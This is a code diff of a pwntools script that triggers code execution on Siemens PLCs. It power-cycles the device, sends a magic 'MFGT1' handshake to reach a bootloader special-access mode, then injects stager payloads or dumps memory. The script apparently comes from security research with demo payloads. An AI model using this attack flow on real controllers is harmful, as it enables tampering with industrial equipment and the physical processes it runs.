@@ -7,11 +7,14 @@ import time
 import socket
 import select
 import sys
-import subprocess
+# import subprocess # No longer needed for power supply
 #import crc32be
 import os
 import argparse
 import logging
+
+# Import power supply control functions
+from tools.powersupply.switch_power import power_control_allnet, power_control_modbus
 
 from binascii import hexlify
 
@@ -19,7 +22,7 @@ from pwn import remote, context, log, xor
 context.update(log_level="info", bits=32, endian="big")
 
 # Setup logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # Runtime configs
@@ -55,6 +58,9 @@ ACTION_DUMP = 'dump'
 ACTION_TEST = "test"
 ACTION_TIC_TAC_TOE = "tictactoe"
 ACTION_HELLO_LOOP = "hello_loop"
+ACTION_POWER_ON_ONLY = "power-on-only"
+ACTION_POWER_OFF_ONLY = "power-off-only"
+
 
 class PayloadManager(object):
     def __init__(self, first_payload_location):
@@ -99,6 +105,19 @@ def recv_packet(r):
     else:
         return answ[1:-1]
 
+def format_size(size_bytes):
+    """Converts a size in bytes to a human-readable string (B, KB, MB, GB)."""
+    if size_bytes < 1024:
+        return "{:.1f} B".format(size_bytes)
+    size_kb = size_bytes / 1024.0
+    if size_kb < 1024:
+        return "{:.1f} KB".format(size_kb)
+    size_mb = size_kb / 1024.0
+    if size_mb < 1024:
+        return "{:.1f} MB".format(size_mb)
+    size_gb = size_mb / 1024.0
+    return "{:.1f} GB".format(size_gb)
+
 def recv_many(r, verbose=False, total_bytes=None, baudrate=115200):
     import sys
     answ = ""
@@ -124,11 +143,12 @@ def recv_many(r, verbose=False, total_bytes=None, baudrate=115200):
                 bar_len = 30
                 filled = int(bar_len * percent)
                 bar = '[' + '=' * filled + ' ' * (bar_len - filled) + ']'
-                sys.stdout.write("\r{} {:6.1f}% {}/{} bytes | Elapsed: {:5.1f}s | ETA: {:5.1f}s".format(
-                    bar, percent*100, done, total_bytes, elapsed, est_left))
+                # Use format_size for done and total_bytes
+                sys.stdout.write("\r{} {:6.1f}% {}/{} | Elapsed: {:5.1f}s | ETA: {:5.1f}s".format(
+                    bar, percent*100, format_size(done), format_size(total_bytes), elapsed, est_left))
                 sys.stdout.flush()
     if total_bytes:
-        sys.stdout.write("\n")
+        sys.stdout.write("\n") # Ensure newline after progress bar completion
     return answ
 
 def encode_packet_for_stager(chunk):
@@ -345,134 +365,201 @@ def handle_conn(r, action, args, payload_manager):
 magic = "MFGT1"
 pad = 4*"A"
 
+def _handle_power_action(args, mode_on):
+    """Helper function to turn power on or off."""
+    action_str = "on" if mode_on else "off"
+    logger.info("Turning power supply {}...".format(action_str))
+    success = False
+    if args.powersupply_method == 'modbus':
+        if not args.modbus_ip or args.modbus_output is None: # Ensure modbus_output is int after parsing
+            logger.error("Modbus IP and output coil must be specified for modbus power control.")
+            sys.exit(1)
+        success = power_control_modbus(args.modbus_ip, args.modbus_port, int(args.modbus_output), mode_on)
+    elif args.powersupply_method == 'allnet':
+        success = power_control_allnet(args.powersupply_host, args.powersupply_port, mode_on)
+    else:
+        logger.error("Unknown power supply method: {}".format(args.powersupply_method))
+        sys.exit(1)
+
+    if success:
+        logger.info("Successfully turned power supply {}.".format(action_str))
+    else:
+        logger.error("Failed to turn power supply {}.".format(action_str))
+        sys.exit(1)
+    return success
+
+
 def main():
     parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')
 
-    common_group = parser.add_argument_group('Common arguments')
-    common_group.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
-                        help="local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH)", required=True)
-    common_group.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
-                        help='switch the power adapter on and off')
-    common_group.add_argument('--powersupply-method', dest='powersupply_method', default='modbus', choices=['allnet', 'modbus'],
-                        help='Power supply control method: modbus (default) or allnet')
-    common_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=60000, type=lambda x: int(x, 0),
-                        help="number of milliseconds to wait before turning on power supply. defaults to 60000 (60s).")
-    common_group.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
-                        help='the location of the stager payload')
-    common_group.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
-    common_group.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")
+    # Power supply arguments (now a separate group for clarity)
+    power_group = parser.add_argument_group('Power Supply Control')
+    power_group.add_argument('--powersupply-method', dest='powersupply_method', default='modbus', choices=['allnet', 'modbus'],
+                        help='Power supply control method: modbus (default) or allnet.')
+    power_group.add_argument('--powersupply-delay', dest='powersupply_delay', default=1000, type=lambda x: int(x, 0), # Default changed to 1s for quicker testing
+                        help="Number of milliseconds to wait after turning OFF power supply before turning it ON. Defaults to 1000 (1s).")
 
-    allnet_group = parser.add_argument_group('ALLNET arguments')
+    allnet_group = power_group.add_argument_group('ALLNET Specific Arguments')
     allnet_group.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply',
-                        help='host of powersupply, defaults to "powersupply", can be changed to support ssh port forwarding')
+                        help='Host of ALLNET powersupply, defaults to "powersupply".')
     allnet_group.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=lambda x: int(x, 0),
-                        help="port of powersupply. defaults to 80, can be changed to support ssh port forwarding")
+                        help="Port of ALLNET powersupply. Defaults to 80.")
 
-    modbus_group = parser.add_argument_group('Modbus TCP arguments')
-    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', help='Modbus TCP IP address (default: 192.168.1.18)')
-    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), help='Modbus TCP port (default: 502)')
-    modbus_group.add_argument('--modbus-output', dest='modbus_output', default=None, help='Modbus output/channel to control')
+    modbus_group = power_group.add_argument_group('Modbus TCP Specific Arguments')
+    modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', help='Modbus TCP IP address (default: 192.168.1.18).')
+    modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), help='Modbus TCP port (default: 502).')
+    modbus_group.add_argument('--modbus-output', dest='modbus_output', default=None, type=int, help='Modbus output/coil (integer) to control. Required for modbus.')
 
-    subparsers = parser.add_subparsers(dest="action")
-    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
+
+    # Main operations group
+    common_group = parser.add_argument_group('Common PLC Interaction Arguments')
+    common_group.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
+                        help="Local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH). Required if not a power-only action.")
+    common_group.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
+                        help='Cycle power (off, delay, on) before performing the specified action. Handshake starts immediately after power on.')
+    common_group.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
+                        help='The location of the stager payload.')
+    common_group.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed.")
+    common_group.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic.")
+
+
+    # Subparsers for different actions
+    subparsers = parser.add_subparsers(dest="action", help="Action to perform. If a power-only action is chosen, other PLC interaction arguments are ignored.")
+
+    # Power-only actions
+    parser_power_on = subparsers.add_parser(ACTION_POWER_ON_ONLY, help="Turn the power supply ON only.")
+    parser_power_off = subparsers.add_parser(ACTION_POWER_OFF_ONLY, help="Turn the power supply OFF only.")
+
+    # PLC interaction actions
+    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK, help="Invoke a hook with a payload.")
     parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
-                        help='The file containing the payload to be executed', required=True)
-    parser_invoke_hook.add_argument('-a', '--args', default="", dest='args', nargs='+', help="Additional arguments to be passed to payload invocation")
+                        help='The file containing the payload to be executed.', required=True)
+    parser_invoke_hook.add_argument('-a', '--args', default="", dest='args', nargs='+', help="Additional arguments to be passed to payload invocation.")
 
-    parser_dump = subparsers.add_parser(ACTION_DUMP)
-    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at", required=True)
-    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump", required=True)
+    parser_dump = subparsers.add_parser(ACTION_DUMP, help="Dump memory from the PLC.")
+    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at.", required=True)
+    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump.", required=True)
     parser_dump.add_argument('-d', '--dump-payload', dest='payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
-    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at")
+    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at.")
 
-    parser_test = subparsers.add_parser(ACTION_TEST)
+    parser_test = subparsers.add_parser(ACTION_TEST, help="Run a test payload.")
     parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
-                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')
+                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin.')
 
-    parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
-                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
+    parser_hello_loop = subparsers.add_parser(ACTION_HELLO_LOOP, help="Run the hello_loop payload.") # Corrected parser name
+    parser_hello_loop.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
+                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin.')
 
-    parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
-    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
-                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')
+    parser_tic_tac_toe = subparsers.add_parser(ACTION_TIC_TAC_TOE, help="Run the tic_tac_toe payload.") # Corrected parser name
+    parser_tic_tac_toe.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
+                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin.')
 
     args = parser.parse_args()
-    payload_manager = PayloadManager(FIRST_PAYLOAD_LOCATION)
 
-    try:
-        s = remote("localhost", args.port)
-    except Exception as e:
-        logger.error("[!] Failed to connect to remote host on port {}: {}".format(args.port, e))
-        sys.exit(1)
+    # Handle power-only actions first
+    if args.action == ACTION_POWER_ON_ONLY:
+        _handle_power_action(args, mode_on=True)
+        sys.exit(0)
+    elif args.action == ACTION_POWER_OFF_ONLY:
+        _handle_power_action(args, mode_on=False)
+        sys.exit(0)
+
+    # For other actions, the PLC port is required
+    if args.port is None:
+        parser.error("Argument -P/--port is required for action '{}'.".format(args.action))
+
+    # Validate modbus output if method is modbus and it's not a power-only action already handled
+    if (args.switch_power or args.powersupply_method == 'modbus') and args.modbus_output is None and args.powersupply_method == 'modbus':
+         # This check is a bit broad, refine if only specific actions need it with modbus
+        if args.action not in [ACTION_POWER_ON_ONLY, ACTION_POWER_OFF_ONLY]: # Already handled
+            logger.warning("Warning: --modbus-output is not set. This might be required for power control with modbus method.")
+            # If switch_power is true, it will fail later in _handle_power_action if modbus_output is truly needed.
+            # If only powersupply_method is 'modbus' but switch_power is false, this is just a warning.
+
+    payload_manager = PayloadManager(FIRST_PAYLOAD_LOCATION)
+    s = None # Initialize s to None
 
     if args.switch_power:
-        logger.info("Turning off power supply and sleeping for {:d} milliseconds".format(args.powersupply_delay))
-        power_args = []
-        if args.powersupply_method == 'modbus':
-            power_args = [
-                '--method', 'modbus',
-                '--modbus-ip', str(args.modbus_ip) if args.modbus_ip else '',
-                '--modbus-port', str(args.modbus_port),
-                ]
-            if args.modbus_output is not None:
-                power_args += ['--modbus-output', str(args.modbus_output)]
-        else:
-            power_args = [
-                '--method', 'allnet',
-                '--port', str(args.powersupply_port),
-                '--host', args.powersupply_host,
-            ]
-        try:
-            ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['off'])
-            logger.info("[+] Turned off power supply, sleeping and starting handshake attempts")
-        except subprocess.CalledProcessError as e:
-            logger.error("[!] Failed to turn off power supply: {}".format(e))
+        logger.info("Power cycling sequence started...")
+        # 1. Turn Power OFF
+        if not _handle_power_action(args, mode_on=False):
+            logger.error("Failed to turn power OFF. Aborting.")
             sys.exit(1)
 
-        power_off_success = ret
-        if power_off_success == 0:
-            power_off_time = time.time()
+        # 2. Wait for the specified delay
+        delay_sec = args.powersupply_delay / 1000.0
+        logger.info("Waiting for {:.2f} seconds before turning power ON.".format(delay_sec))
+        time.sleep(delay_sec)
+
+        # 3. Turn Power ON
+        if not _handle_power_action(args, mode_on=True):
+            logger.error("Failed to turn power ON. Aborting.")
+            sys.exit(1)
+
+        logger.info("Power ON successful. Attempting to connect and handshake immediately...")
+        # Connection and handshake attempts should start immediately after power on
+        # The original code had a loop that also checked power_on_time, which is now simplified.
+
+        # Attempt to connect to PLC
+        try:
+            s = remote("localhost", args.port)
+        except Exception as e:
+            logger.error("[!] Failed to connect to remote host on port {} after power cycle: {}".format(args.port, e))
+            sys.exit(1)
 
         handshake_received = False
-        handshake_start = time.time()
-        delay_sec = args.powersupply_delay / 1000.0
-        power_on_time = power_off_time + delay_sec
-        power_on_actual = None
-        i = 0
-        while not handshake_received:
-            now = time.time()
-            if now >= power_on_time and power_on_actual is None:
-                try:
-                    ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['on'])
-                    logger.info("[+] Turned on power supply after {:d} ms".format(args.powersupply_delay))
-                except subprocess.CalledProcessError as e:
-                    logger.error("[!] Failed to turn on power supply: {}".format(e))
-                    sys.exit(1)
-                power_on_actual = time.time()
-            if power_on_actual is not None and (now - power_on_actual) > 5.0:
-                logger.error("[!] Handshake timeout: did not receive special access greeting within 5 seconds after power on.")
-                sys.exit(1)
-            if power_on_time - now < 0.2 or power_on_actual is not None:
-                s.send(pad + magic)
-                try:
-                    answ = s.recv(256, timeout=0.1)
-                except Exception:
-                    answ = ''
-                if answ and answ.startswith("\5-CPU"):
-                    if not answ.startswith("\5-CPU"):
-                        answ += s.recv(256)
-                    assert(answ.startswith("\5-CPU"))
-                    s.unrecv(answ)
-                    handshake_received = True
-                    logger.info("[+] Special access greeting received!")
-                    handle_conn(s, args.action, args, payload_manager)
-                    break
-            i += 1
-        logger.info("Done.")
-        return
+        handshake_attempts = 0
+        max_handshake_attempts = 50 # Try for 5 seconds (50 * 0.1s timeout)
 
-    handle_conn(s, args.action, args, payload_manager)
+        while not handshake_received and handshake_attempts < max_handshake_attempts:
+            s.send(pad + magic)
+            try:
+                answ = s.recv(256, timeout=0.1) # Short timeout for quick retries
+            except Exception: # Catches socket.timeout and other pwn.socket.timeout etc.
+                answ = ''
+
+            if answ and answ.startswith("\5-CPU"):
+                # Sometimes the full greeting isn't received in one go
+                # This part might need adjustment based on observed behavior
+                # For now, assume if it starts with \5-CPU, it's likely the greeting
+                # The original code had s.recv(256) again, which could block if no more data.
+                # Keeping it simple: if it starts with the magic bytes, assume success.
+                if not answ.endswith("\r\n"): # Simple check, might need refinement
+                    try:
+                        answ += s.recv(256, timeout=0.1) # Try to get more if needed
+                    except Exception:
+                        pass # Ignore if no more data immediately
+
+                # Ensure the full expected prefix, though the original only checked startswith
+                # For robustness, one might check the full expected greeting format if known.
+                # For now, stick to the original logic's spirit:
+                if answ.startswith("\5-CPU"): # Re-check in case recv changed it
+                    s.unrecv(answ) # Put the full received answer back for handle_conn
+                    handshake_received = True
+                    logger.info("[+] Special access greeting received after power cycle!")
+                    handle_conn(s, args.action, args, payload_manager)
+                    sys.exit(0) # Successfully handled connection
+
+            handshake_attempts += 1
+            if not handshake_received:
+                logger.info("Handshake attempt {} failed. Retrying...".format(handshake_attempts))
+                # No explicit sleep here as recv timeout provides a delay
+
+        if not handshake_received:
+            logger.error("[!] Handshake timeout: did not receive special access greeting after {} attempts.".format(max_handshake_attempts))
+            if s:
+                s.close()
+            sys.exit(1)
+        return # Should have exited via sys.exit(0) or sys.exit(1) above
+
+    # If not switching power, connect directly (if an action other than power-only is given)
+    if args.action and args.action not in [ACTION_POWER_ON_ONLY, ACTION_POWER_OFF_ONLY]:
+        try:
+            s = remote("localhost", args.port)
+        except Exception as e:
+            logger.error("[!] Failed to connect to remote host on port {}: {}".format(args.port, e))
+            sys.exit(1)
+        handle_conn(s, args.action, args, payload_manager)
 
 if __name__ == "__main__":
     main()
